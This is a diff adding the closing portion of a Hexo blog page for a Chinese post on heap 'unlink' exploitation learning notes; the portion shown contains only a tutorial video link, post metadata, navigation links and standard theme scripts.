+</ul>
+</li>
+<li><p>Bilibili</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV11q4y1E7E2?vd_source=03d433e8ec785208bc57517d4c340d73">【星盟安全】PWN系列教程 第20节 Unlink</a></li>
+</ul>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+        <a href="/tags/%E5%A0%86/" class="print-no-link">#堆</a>
+      
+        <a href="/tags/unlink/" class="print-no-link">#unlink</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Unlink学习记录</div>
+      <div>https://hanashigure.github.io/2026/02/11/heap-ptmalloc2-unlink/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>花時雨</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/02/14/hitcon-training-unlink/" title="hitcon-training-unlink writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">hitcon-training-unlink writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/09/chunk-extend-overlapping/" title="Chunk Extend and Overlapping">
+                        <span class="hidden-mobile">Chunk Extend and Overlapping</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/love.js"></script>
+<script src="/js/sakura.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
